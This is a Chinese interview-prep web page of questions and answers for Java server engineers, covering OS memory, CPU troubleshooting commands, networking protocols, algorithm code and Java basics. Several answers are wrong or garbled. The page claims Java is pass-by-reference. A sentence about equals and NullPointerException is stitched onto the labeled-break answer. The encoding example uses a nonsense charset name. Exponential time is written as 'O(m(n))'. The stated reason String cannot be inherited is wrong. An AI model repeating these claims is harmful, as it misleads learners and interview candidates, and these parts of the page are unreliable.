pid；系统发送一个signal,程序收到信号后，会先释放资源，再关闭程序。</li><li>kill -9 pid；-9表示强制执行</li></ol><h4 id="你怎么理解操作系统里的内存碎片，有什么解决办法？"><a href="#你怎么理解操作系统里的内存碎片，有什么解决办法？" class="headerlink" title="你怎么理解操作系统里的内存碎片，有什么解决办法？"></a>你怎么理解操作系统里的内存碎片，有什么解决办法？</h4><p>内存碎片分为：内部碎片和外部碎片。</p><p>内部碎片就是已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间；</p><p>内部碎片是处于区域内部或页面内部的存储块。占有这些区域或页面的进程并不使用这个存储块。而在进程占有这块存储块时，系统无法利用它。直到进程释放它，或进程结束时，系统才有可能利用这个存储块。</p><p>单道连续分配只有内部碎片。多道固定连续分配既有内部碎片，又有外部碎片。</p><p>外部碎片指的是还没有被分配出去（不属于任何进程），但由于太小了无法分配给申请内存空间的新进程的内存空闲区域。</p><p>外部碎片是出于任何已分配区域或页面外部的空闲存储块。这些存储块的总和可以满足当前申请的长度要求，但是由于它们的地址不连续或其他原因，使得系统无法满足当前申请。</p><p>使用伙伴系统算法。</p><h4 id="介绍一下，什么是页式存储？"><a href="#介绍一下，什么是页式存储？" class="headerlink" title="介绍一下，什么是页式存储？"></a>介绍一下，什么是页式存储？</h4><p>主存被等分成大小相等的片，称为主存块，又称为实页。</p><p>当一个用户程序装入内存时，以页面为单位进行分配。页面的大小是为2n ,通常为1KB、2KB、2n KB等</p><h4 id="系统如何提高并发性？"><a href="#系统如何提高并发性？" class="headerlink" title="系统如何提高并发性？"></a>系统如何提高并发性？</h4><ol><li>提高CPU并发计算能力 </li><li>改进I/O模型</li></ol><h4 id="追踪-CPU-过高的方法"><a href="#追踪-CPU-过高的方法" class="headerlink" title="追踪 CPU 过高的方法"></a>追踪 CPU 过高的方法</h4><ol><li>首先查看是哪些进程的CPU占用率最高（如下可以看到详细的路径）</li></ol><blockquote><p>ps -aux –sort -pcpu | more</p></blockquote><ol start="2"><li>查看JAVA进程的每个线程的CPU占用率</li></ol><blockquote><p>ps -Lp 5798 cu | more        # 5798是查出来进程PID</p></blockquote><ol start="3"><li>追踪线程，查看负载过高的原因，使用JDK下的一个工具</li></ol><blockquote><p>jstack 5798  </p></blockquote><p>jstack 查出来的线程ID是16进制，可以把输出追加到文件，导出用记事本打开，再根据系统中的线程ID去搜索查看该ID的线程运行内容，可以和开发一起排查。</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h3 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h3><h4 id="说一说计算机网络的分层模型。"><a href="#说一说计算机网络的分层模型。" class="headerlink" title="说一说计算机网络的分层模型。"></a>说一说计算机网络的分层模型。</h4><p><img src="/interview/interview/java-server-enginer-interview/980266035_1565787665824_1ABB2DC3D76311944FFDBE9980FBAADD.jpeg" alt="img"></p><h4 id="路由器和交换机的区别？"><a href="#路由器和交换机的区别？" class="headerlink" title="路由器和交换机的区别？"></a>路由器和交换机的区别？</h4><p>交换机用于同一网络内部数据的快速传输转发决策通过查看二层头部完成转发不需要修改数据帧工作在 TCP/IP 协议的二层 —— 数据链路层工作简单，直接使用硬件处理路由器用于不同网络间数据的跨网络传输转发决策通过查看三层头部完成转发需要修改 TTL ，IP 头部校验和需要重新计算，数据帧需要重新封装工作在 TCP/IP 协议的三层 —— 网络层工作复杂，使用软件处理。</p><p>三层交换机也能作为路由器使用。</p><h4 id="请简单解释一下，arp协议和arp攻击。"><a href="#请简单解释一下，arp协议和arp攻击。" class="headerlink" title="请简单解释一下，arp协议和arp攻击。"></a>请简单解释一下，arp协议和arp攻击。</h4><p>地址解析协议。ARP攻击的第一步就是ARP欺骗。由上述“ARP协议的工作过程”我们知道，ARP协议基本没有对网络的安全性做任何思考，当时人们考虑的重点是如何保证网络通信能够正确和快速的完成——ARP协议工作的前提是默认了其所在的网络是一个善良的网络，每台主机在向网络中发送应答信号时都是使用的真实身份。不过后来，人们发现ARP应答中的IP地址和MAC地址中的信息是可以伪造的，并不一定是自己的真实IP地址和MAC地址，由此，ARP欺骗就产生了。</p><h4 id="IP-层是-TCP-IP-模型下那一层？"><a href="#IP-层是-TCP-IP-模型下那一层？" class="headerlink" title="IP 层是 TCP/IP 模型下那一层？"></a>IP 层是 TCP/IP 模型下那一层？</h4><p>网络层。</p><h4 id="为什么有了-MAC-地址还需要-IP-地址？"><a href="#为什么有了-MAC-地址还需要-IP-地址？" class="headerlink" title="为什么有了 MAC 地址还需要 IP 地址？"></a>为什么有了 MAC 地址还需要 IP 地址？</h4><p>Mac 地址用于网络层以下的连接建立。IP 用于网络层连接建立，意义不同。</p><h4 id="请说一说-TCP-协议的-4-次握手"><a href="#请说一说-TCP-协议的-4-次握手" class="headerlink" title="请说一说 TCP 协议的 4 次握手"></a>请说一说 TCP 协议的 4 次握手</h4><p>由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。</p><p>TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在socket编程中，任何一方执行close()操作即可产生挥手操作。</p><ol><li>客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。</li><li>服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号</li><li>服务器B关闭与客户端A的连接，发送一个FIN给客户端A。</li><li>客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。</li></ol><p><img src="/interview/interview/java-server-enginer-interview/308572_1538028144543_FCAC824D9C1E4301A60CF7D48A85E1C1.png" alt="img"></p><h4 id="TCP-为什么可靠一些"><a href="#TCP-为什么可靠一些" class="headerlink" title="TCP 为什么可靠一些"></a>TCP 为什么可靠一些</h4><p>三次握手，超时重传，滑动窗口，拥塞控制。</p><h4 id="哪种应用场景会使用TCP协议，使用它的意义"><a href="#哪种应用场景会使用TCP协议，使用它的意义" class="headerlink" title="哪种应用场景会使用TCP协议，使用它的意义"></a>哪种应用场景会使用TCP协议，使用它的意义</h4><p>当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议</p><h4 id="icmp协议，它的作用是什么？"><a href="#icmp协议，它的作用是什么？" class="headerlink" title="icmp协议，它的作用是什么？"></a>icmp协议，它的作用是什么？</h4><p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p>ICMP 服务可以被主机关闭， ping 不可达，但是应用可以连接。</p><h4 id="请你讲讲http1-1和1-0的区别"><a href="#请你讲讲http1-1和1-0的区别" class="headerlink" title="请你讲讲http1.1和1.0的区别"></a>请你讲讲http1.1和1.0的区别</h4><p>主要区别主要体现在：</p><p>缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。</p><p>带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p><p>错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p><p>Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。</p><p>长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。</p><p>目前应用都是用 1.1 的协议。</p><h4 id="请说明一下http和https的区别"><a href="#请说明一下http和https的区别" class="headerlink" title="请说明一下http和https的区别"></a>请说明一下http和https的区别</h4><ol><li>https协议要申请证书到ca，需要一定经济成本；</li><li>http是明文传输，https是加密的安全传输；</li><li>连接的端口不一样，http是80，https是443；</li><li>http连接很简单，没有状态；https是ssl加密的传输，身份认证的网络协议，相对http传输比较安全</li></ol><h4 id="浏览器从接收到一个URL，到最后展示出页面，经历了哪些过程。"><a href="#浏览器从接收到一个URL，到最后展示出页面，经历了哪些过程。" class="headerlink" title="浏览器从接收到一个URL，到最后展示出页面，经历了哪些过程。"></a>浏览器从接收到一个URL，到最后展示出页面，经历了哪些过程。</h4><ol><li>DNS解析 </li><li>TCP连接</li><li>发送HTTP请求</li><li>服务器处理请求并返回HTTP报文</li><li>浏览器解析渲染页面</li></ol><h4 id="http请求中的304状态码的含义"><a href="#http请求中的304状态码的含义" class="headerlink" title="http请求中的304状态码的含义"></a>http请求中的304状态码的含义</h4><p>304(未修改)自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。如果网页自请求者上次请求后再也没有更改过，您应将服务器配置为返回此响应(称为 If-Modified-Since HTTP 标头)。服务器可以告诉 Googlebot 自从上次抓取后网页没有变更，进而节省带宽和开销。</p><h4 id="请谈一下，你知道的http请求"><a href="#请谈一下，你知道的http请求" class="headerlink" title="请谈一下，你知道的http请求"></a>请谈一下，你知道的http请求</h4><ul><li>OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。</li><li>HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</li><li>GET：向特定的资源发出请求。</li><li>POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</li><li>PUT：向指定资源位置上传其最新内容。</li><li>DELETE：请求服务器删除Request-URI所标识的资源。</li><li>TRACE：回显服务器收到的请求，主要用于测试或诊断。</li><li>CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</li></ul><h4 id="请谈一下，你知道的-HTTP-常用的状态码"><a href="#请谈一下，你知道的-HTTP-常用的状态码" class="headerlink" title="请谈一下，你知道的 HTTP 常用的状态码"></a>请谈一下，你知道的 HTTP 常用的状态码</h4><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>Informational</td><td>（信息性状态码）    接受的请求正在处理</td></tr><tr><td>2XX</td><td>Success</td><td>（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection</td><td>（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error</td><td>（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error</td><td>（服务器错误状态码）</td><td>服务器处理请求出错</td></tr></tbody></table><h3 id="数据库原理"><a href="#数据库原理" class="headerlink" title="数据库原理"></a>数据库原理</h3><h2 id="数据结构和算法"><a href="#数据结构和算法" class="headerlink" title="数据结构和算法"></a>数据结构和算法</h2><h3 id="算法通识"><a href="#算法通识" class="headerlink" title="算法通识"></a>算法通识</h3><h4 id="常见的算法复杂度有哪些？"><a href="#常见的算法复杂度有哪些？" class="headerlink" title="常见的算法复杂度有哪些？"></a>常见的算法复杂度有哪些？</h4><p>在计算机科学中，时间复杂性，又称时间复杂度，算法的时间复杂度是一个函数，它定性描述该算法的运行时间。这是一个代表算法输入值的字符串的长度的函数。时间复杂度常用大O符号表述，不包括这个函数的低阶项和首项系数。使用这种方式时，时间复杂度可被称为是渐近的，亦即考察输入值大小趋近无穷时的情况。</p><ul><li>O(1)  常数时间</li><li>O(logn) 算法的T(n) =O(logn)，则称其具有对数时间。特征为运算时间的步速比输入的步速小，例如二分查找、二叉树搜索。</li><li>O(n) 如果一个算法的时间复杂度为O(n)，则称这个算法具有线性时间，或O(n)时间。例如对于无序列表的查找算法。</li><li>O(n^2+n) 多项式时间 大多数业务系统都是多项式时间，例如 1+ N 的数据处理问题。</li><li>O(m(n)) 呈指数上升，输入数据的数量依线性成长，所花的时间将会以指数成长。指数时间负载度会造成系统基本不可用。</li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="将一个二维数组顺时针旋转90度"><a href="#将一个二维数组顺时针旋转90度" class="headerlink" title="将一个二维数组顺时针旋转90度"></a>将一个二维数组顺时针旋转90度</h4><pre><code class="java">public void rotate(int[][] matrix) {  int n = matrix.length;  for (int i = 0; i &lt; n / 2; i++) {    for (int j = i; j &lt; n - 1 - i; j++) {      int temp = matrix[i][j];      matrix[i][j] = matrix[n - 1 - j][i];      matrix[n - 1 - j][i] = matrix[n - 1 - i][n - 1 - j];      matrix[n - 1 - i][n - 1 - j] = matrix[j][n - 1 - i];      matrix[j][n - 1 - i] = temp;    }  }}</code></pre><h4 id="一个数组，除一个元素外其它都是两两相等，求那个元素"><a href="#一个数组，除一个元素外其它都是两两相等，求那个元素" class="headerlink" title="一个数组，除一个元素外其它都是两两相等，求那个元素?"></a>一个数组，除一个元素外其它都是两两相等，求那个元素?</h4><pre><code class="java">public static int find1From2(int[] a){        int len = a.length, res = 0;        for(int i = 0; i &lt; len; i++){            res= res ^ a[i];        }        return res;}</code></pre><h4 id="找出数组中和为S的一对组合，找出一组就行"><a href="#找出数组中和为S的一对组合，找出一组就行" class="headerlink" title="找出数组中和为S的一对组合，找出一组就行"></a>找出数组中和为S的一对组合，找出一组就行</h4><pre><code>public int[]twoSum(int[] nums, int target) {        HashMap&lt;Integer, Integer&gt; map =new HashMap&lt;Integer, Integer&gt;();        int[] a = new int[2];        map.put(nums[0], 0);        for (int i = 1; i &lt; nums.length;i++) {            if (map.containsKey(target - nums[i])) {                a[0] = map.get(target -nums[i]);                a[1] = i;                return a;            } else {                map.put(nums[i], i);            }        }        return a;}</code></pre><h4 id="求一个数组中连续子向量的最大和"><a href="#求一个数组中连续子向量的最大和" class="headerlink" title="求一个数组中连续子向量的最大和"></a>求一个数组中连续子向量的最大和</h4><pre><code>public intmaxSubArray(int[] nums) {        int sum = 0;        int maxSum = Integer.MIN_VALUE;        if (nums == null || nums.length == 0) {            return sum;        }        for(int i = 0; i &lt; nums.length;i++) {            sum += nums[i];            maxSum = Math.max(maxSum, sum);            if (sum &lt; 0) {                sum = 0;            }        }        return maxSum;}</code></pre><h4 id="寻找一数组中前K个最大的数"><a href="#寻找一数组中前K个最大的数" class="headerlink" title="寻找一数组中前K个最大的数"></a>寻找一数组中前K个最大的数</h4><pre><code>public int findKthLargest(int[] nums, int k) {    if (k &lt; 1 || nums == null) {        return 0;    }    return getKth(nums.length - k + 1, nums, 0, nums.length - 1);}public int getKth(int k, int[] nums, int start, int end) {    int pivot = nums[end];    int left = start;    int right = end;    while (true) {        while (nums[left] &lt; pivot &amp;&amp; left &lt; right) {            left++;        }        while (nums[right] &gt;= pivot &amp;&amp; right &gt; left) {            right--;        }        if (left == right) {            break;        }        swap(nums, left, right);    }    swap(nums, left, end);    if (k == left + 1) {        return pivot;    } else if (k &lt; left + 1) {        return getKth(k, nums, start, left - 1);    } else {        return getKth(k, nums, left + 1, end);    }}public void swap(int[] nums, int n1, int n2) {    int tmp = nums[n1];    nums[n1] = nums[n2];    nums[n2] = tmp;}</code></pre><h3 id="HASH"><a href="#HASH" class="headerlink" title="HASH"></a>HASH</h3><h3 id="应用算法"><a href="#应用算法" class="headerlink" title="应用算法"></a>应用算法</h3><h4 id="LRU算法是什么？"><a href="#LRU算法是什么？" class="headerlink" title="LRU算法是什么？"></a>LRU算法是什么？</h4><p>LRU（Least recently used，最近最少使用）算法根据数据的历史访问记录来进行淘汰数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也很高”，反过来说“如果数据最近这段时间一直都没有访问,那么将来被访问的概率也会很低”，两种理解是一样的；常用于页面置换算法，为虚拟页式存储管理服务。</p><p>LRU 算法被用于 Redis 中作为淘汰策略。</p><h4 id="LFU-的原理是什么？"><a href="#LFU-的原理是什么？" class="headerlink" title="LFU 的原理是什么？"></a>LFU 的原理是什么？</h4><p>LRU 根据最近最少使用来作为淘汰策略，LFU 根据访问频率来作为淘汰策略。</p><h4 id="HMAC-的用处是什么？"><a href="#HMAC-的用处是什么？" class="headerlink" title="HMAC 的用处是什么？"></a>HMAC 的用处是什么？</h4><p>带密码的 HASH 算法，可以用来做签名。具体的实现有：</p><ul><li>hmac-md5</li><li>hmac-sha1 </li></ul><h4 id="id全局唯一且自增，如何实现？"><a href="#id全局唯一且自增，如何实现？" class="headerlink" title="id全局唯一且自增，如何实现？"></a>id全局唯一且自增，如何实现？</h4><ul><li>UUID</li><li>snowFlake</li></ul><h4 id="什么是布隆过滤器？"><a href="#什么是布隆过滤器？" class="headerlink" title="什么是布隆过滤器？"></a>什么是布隆过滤器？</h4><p>布隆过滤器（Bloom Filter）是1970年由布隆提出的。它实际上是一个很长的二进制向量和一系列随机映射函数。布隆过滤器可以用于检索一个元素是否在一个集合中。它的优点是空间效率和查询时间都比一般的算法要好的多，缺点是有一定的误识别率和删除困难。</p><p>布隆过滤器可以返回元素在集合中可能存在或者一定不存在，布隆过滤器可以用于高效的判断一个元素在集合中是否存在。</p><h2 id="Java-基础"><a href="#Java-基础" class="headerlink" title="Java 基础"></a>Java 基础</h2><h3 id="Java-基础易错"><a href="#Java-基础易错" class="headerlink" title="Java 基础易错"></a>Java 基础易错</h3><h4 id="能用来修饰-interface-的关键字有哪些？"><a href="#能用来修饰-interface-的关键字有哪些？" class="headerlink" title="能用来修饰 interface 的关键字有哪些？"></a>能用来修饰 interface 的关键字有哪些？</h4><p>interface 只允许加 public 修饰符，但是为了代码整洁开发中不应该加 public 关键字。</p><h4 id="在Java中如何跳出当前的多重嵌套循环？"><a href="#在Java中如何跳出当前的多重嵌套循环？" class="headerlink" title="在Java中如何跳出当前的多重嵌套循环？"></a>在Java中如何跳出当前的多重嵌套循环？</h4><p>在最外层循环前加一个标记如A，然后用break A;可以跳出多重循环。（Java中支持带标签的break和continue语句，作用有点类似于C和C++中的goto语句，但是就像要避免使用goto一样，应该避免使用带标签的break和continue，因为它不会让你的程序变得更优雅，很多时候甚至有相反的作用，所以这种语法其实不知道更好），根本不能进行字符串的equals比较，否则会产生NullPointerException异常。</p><h4 id="amp-和-amp-amp-的区别？"><a href="#amp-和-amp-amp-的区别？" class="headerlink" title="&amp; 和 &amp;&amp; 的区别？"></a>&amp; 和 &amp;&amp; 的区别？</h4><p>&amp; 运算符有两种用法：(1)按位与；(2)逻辑与。&amp;&amp;运算符是短路与运算。逻辑与跟短路与的差别是非常巨大的，虽然二者都要求运算符左右两端的布尔值都是true整个表达式的值才是true。&amp;&amp;之所以称为短路运算是因为，如果&amp;&amp;左边的表达式的值是false，右边的表达式会被直接短路掉，不会进行运算。很多时候我们可能都需要用&amp;&amp;而不是&amp;，例如在验证用户登录时判定用户名不是null而且不是空字符串，应当写为：username != null &amp;&amp;!username.equals(“”)，二者的顺序不能交换，更不能用&amp;运算符，因为第一个条件如果不成立，根本不能进行字符串的equals比较，否则会产生NullPointerException异常。</p><p>&amp; 不会发生短路，&amp;&amp; 会发生短路。</p><h4 id="int-和-Integer-有什么区别，什么时候应该使用他们？"><a href="#int-和-Integer-有什么区别，什么时候应该使用他们？" class="headerlink" title="int 和 Integer 有什么区别，什么时候应该使用他们？"></a>int 和 Integer 有什么区别，什么时候应该使用他们？</h4><p>Java是一个近乎纯洁的面向对象编程语言，但是为了编程的方便还是引入了基本数据类型，但是为了能够将这些基本数据类型当成对象操作，Java为每一个基本数据类型都引入了对应的包装类型（wrapper class），int的包装类就是Integer，从Java 5开始引入了自动装箱/拆箱机制，使得二者可以相互转换。<br>Java 为每个原始类型提供了包装类型：</p><ul><li>原始类型: boolean，char，byte，short，int，long，float，double</li><li>包装类型：Boolean，Character，Byte，Short，Integer，Long，Float，Double</li></ul><p>一般场景使用基本类型，提高效率；序列化/反序列化场景使用包装类型，避免反序列化失败。</p><h4 id="如何输出一个某种编码的字符串？"><a href="#如何输出一个某种编码的字符串？" class="headerlink" title="如何输出一个某种编码的字符串？"></a>如何输出一个某种编码的字符串？</h4><p>使用字节数组获取与编码无关的字节，然后转出特性字符集的字符串即可.</p><pre><code>new String(str.getBytes(&quot;烫烫烫&quot;), “GBK”);</code></pre><h4 id="new-String-、StringBuffer、StringBuilder-构造字符串-的区别是什么？"><a href="#new-String-、StringBuffer、StringBuilder-构造字符串-的区别是什么？" class="headerlink" title="new String()、StringBuffer、StringBuilder 构造字符串 的区别是什么？"></a>new String()、StringBuffer、StringBuilder 构造字符串 的区别是什么？</h4><ul><li>String 是不可变对象，每次都是创建新对象，包括字面量创建也是 例如 “hello” + “world”</li><li>StringBuilder 会复用对象，但是线程不安全</li><li>StringBuffer 会复用对象，线程安全</li></ul><p>小字符串使用 new String(); 大字符串使用 StringBuilder，需要线程安全使用 StringBuffer。</p><h4 id="String-是最基本的数据类型吗"><a href="#String-是最基本的数据类型吗" class="headerlink" title="String 是最基本的数据类型吗?"></a>String 是最基本的数据类型吗?</h4><p>基本数据类型包括byte、int、char、long、float、double、boolean和short。 String 是一个类，本质上是字符数组和 C++ 类似。</p><h4 id="String是否能能继承？"><a href="#String是否能能继承？" class="headerlink" title="String是否能能继承？"></a>String是否能能继承？</h4><p>不能，char数组用final修饰的。</p><h4 id="数组-Array-和列表-ArrayList-的区别？什么时候应该使用Array而不是ArrayList？"><a href="#数组-Array-和列表-ArrayList-的区别？什么时候应该使用Array而不是ArrayList？" class="headerlink" title="数组(Array)和列表(ArrayList)的区别？什么时候应该使用Array而不是ArrayList？"></a>数组(Array)和列表(ArrayList)的区别？什么时候应该使用Array而不是ArrayList？</h4><p>Array和ArrayList的不同点：<br>Array可以包含基本类型和对象类型，ArrayList只能包含对象类型。<br>Array大小是固定的，ArrayList的大小是动态变化的。<br>ArrayList提供了更多的方法和特性，比如：addAll()，removeAll()，iterator()等等。<br>对于基本类型数据，集合使用自动装箱来减少编码工作量。但是，当处理固定大小的基本数据类型的时候，这种方式相对比较慢。</p><h4 id="什么是值传递和引用传递？"><a href="#什么是值传递和引用传递？" class="headerlink" title="什么是值传递和引用传递？"></a>什么是值传递和引用传递？</h4><p>JAVA、JavaScript 为引用传递, PHP 为值传递，可以通过 &amp; 修改为引用传递。</p><p>应该尽可能避免引用传递。</p><h4 id="为什么会出现4-0-3-6-0-40000001这种现象？"><a href="#为什么会出现4-0-3-6-0-40000001这种现象？" class="headerlink" title="为什么会出现4.0-3.6=0.40000001这种现象？"></a>为什么会出现4.0-3.6=0.40000001这种现象？</h4><p>2进制的小数无法精确的表达10进制小数，计算机在计算10进制小数的过程中要先转换为2进制进行计算，这个过程中出现了误差。</p><h4 id="Lamda表达式的优缺点？"><a href="#Lamda表达式的优缺点？" class="headerlink" title="Lamda表达式的优缺点？"></a>Lamda表达式的优缺点？</h4><p>优点：1. 简洁。2. 非常容易并行计算。3. 可能代表未来的编程趋势。</p><p>缺点：1. 若不用并行计算，很多时候计算速度没有比传统的 for 循环快。（并行计算有时需要预热才显示出效率优势）2. 不容易调试。3. 若其他程序员没有学过 lambda 表达式，代码不容易让其他语言的程序员看懂。</p><h4 id="你知道java8的新特性吗，请简单介绍一下？"><a href="#你知道java8的新特性吗，请简单介绍一下？" class="headerlink" title="你知道java8的新特性吗，请简单介绍一下？"></a>你知道java8的新特性吗，请简单介绍一下？</h4><ul><li>Lambda 表达式 − Lambda允许把函数作为一个方法的参数（函数作为参数传递进方法中。</li><li>方法引用− 方法引用提供了非常有用的语法，可以直接引用已有Java类或对象（实例）的方法或构造器。与lambda联合使用，方法引用可以使语言的构造更紧凑简洁，减少冗余代码。</li><li>默认方法− 默认方法就是一个在接口里面有了一个实现的方法。</li><li>新工具− 新的编译工具，如：Nashorn引擎 jjs、 类依赖分析器jdeps。</li><li>Stream API −新添加的Stream API（java.util.stream） 把真正的函数式编程风格引入到Java中。</li><li>Date Time API − 加强对日期与时间的处理。</li><li>Optional 类 − Optional 类已经成为 Java 8 类库的一部分，用来解决空指针异常。</li><li>Nashorn, JavaScript 引擎 − Java 8提供了一个新的Nashorn javascript引擎，它允许我们在JVM上运行特定的javascript应用。</li></ul><h4 id="符号“-”比较的是什么？"><a href="#符号“-”比较的是什么？" class="headerlink" title="符号“==”比较的是什么？"></a>符号“==”比较的是什么？</h4><p>“==”对比两个对象基于内存引用，如果两个对象的引用完全相同（指向同一个对象）时，“==”操作将返回true，否则返回false。“==”如果两边是基本类型，就是比较数值是否相等。</p><p>对于类，避免使用 == 应该使用 equals 代替。</p><h4 id="Object若不重写hashCode-的话，hashCode-如何计算出来的？"><a href="#Object若不重写hashCode-的话，hashCode-如何计算出来的？" class="headerlink" title="Object若不重写hashCode()的话，hashCode()如何计算出来的？"></a>Object若不重写hashCode()的话，hashCode()如何计算出来的？</h4><p>Object 的 hashcode 方法是本地方法，也就是用 c 语言或 c++ 实现的，该方法直接返回对象的 内存地址。</p><h4 id="为什么重写equals还要重写hashcode？"><a href="#为什么重写equals还要重写hashcode？" class="headerlink" title="为什么重写equals还要重写hashcode？"></a>为什么重写equals还要重写hashcode？</h4><p>HashMap中，如果要比较key是否相等，要同时使用这两个函数！因为自定义的类的hashcode()方法继承于Object类，其hashcode码为默认的内存地址，这样即便有相同含义的两个对象，比较也是不相等的。HashMap中的比较key是这样的，先求出key的hashcode(),比较其值是否相等，若相等再比较equals(),若相等则认为他们是相等的。若equals()不相等则认为他们不相等。如果只重写hashcode()不重写equals()方法，当比较equals()时只是看他们是否为同一对象（即进行内存地址的比较）,所以必定要两个方法一起重写。HashMap用来判断key是否相等的方法，其实是调用了HashSet判断加入元素 是否相等。重载hashCode()是为了对同一个key，能得到相同的Hash Code，这样HashMap就可以定位到我们指定的key上。重载equals()是为了向HashMap表明当前对象和key上所保存的对象是相等的，这样我们才真正地获得了这个key所对应的这个键值对。</p><p>hashCode 是为了获取 hash 的 key; equals 是为了判断是否相等。</p><h4 id="map-的分类和注意事项？"><a href="#map-的分类和注意事项？" class="headerlink" title="map 的分类和注意事项？"></a>map 的分类和注意事项？</h4><ul><li>Map主要用于存储健值对，根据键得到值，因此不允许键重复(重复了覆盖了),但允许值重复。</li><li>Hashmap 是一个最常用的Map,它根据键的HashCode值存储数据,根据键可以直接获取它的值，具有很快的访问速度，遍历时，取得数据的顺序是完全随机的。ConcurrentHashMap 是其同步版本，Hashtable 性能太差。</li><li>LinkedHashMap 是HashMap的一个子类，保存了记录的插入顺序，在用Iterator遍历LinkedHashMap时，先得到的记录肯定是先插入的.也可以在构造时用带参数，按照应用次数排序。在遍历的时候会比HashMap慢，不过有种情况例外，当HashMap容量很大，实际数据较少时，遍历起来可能会比 LinkedHashMap慢，因为LinkedHashMap的遍历速度只和实际数据有关，和容量无关，而HashMap的遍历速度和他的容量有关。</li><li>TreeMap实现SortMap接口，能够把它保存的记录根据键排序,默认是按键值的升序排序，也可以指定排序的比较器，当用Iterator 遍历TreeMap时，得到的记录是排过序的。</li></ul><p>一般情况下，我们用的最多的是HashMap,在Map 中插入、删除和定位元素，HashMap 是最好的选择。但如果您要按自然顺序或自定义顺序遍历键，那么TreeMap会更好。如果需要输出的顺序和输入的相同,那么用LinkedHashMap 可以实现,它还可以按读取顺序来排列.</p><p>HashMap 的使用需要注意初始容量，否则频繁扩容会造成性能很差。</p><h4 id="Java里面的final关键字是怎么用的？"><a href="#Java里面的final关键字是怎么用的？" class="headerlink" title="Java里面的final关键字是怎么用的？"></a>Java里面的final关键字是怎么用的？</h4><p>用final修饰一个类时，表明这个类不能被继承。也就是说，如果一个类你永远不会让他被继承，就可以用final进行修饰。final类中的成员变量可以根据需要设为final，但是要注意final类中的所有成员方法都会被隐式地指定为final方法。</p><p>用final修饰一个方法时，原因有两个。第一个原因是把方法锁定，以防任何继承类修改它的含义；第二个原因是效率。在早期的Java实现版本中，会将final方法转为内嵌调用。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升。在最近的Java版本中，不需要使用final方法进行这些优化了。</p><p>用final修饰一个变量，如果是基本数据类型的变量，则其数值一旦在初始化之后便不能更改；如果是引用类型的变量，则在对其初始化之后便不能再让其指向另一个对象。</p><h4 id="Synchronized-和-lock-区别？"><a href="#Synchronized-和-lock-区别？" class="headerlink" title="Synchronized 和 lock 区别？"></a>Synchronized 和 lock 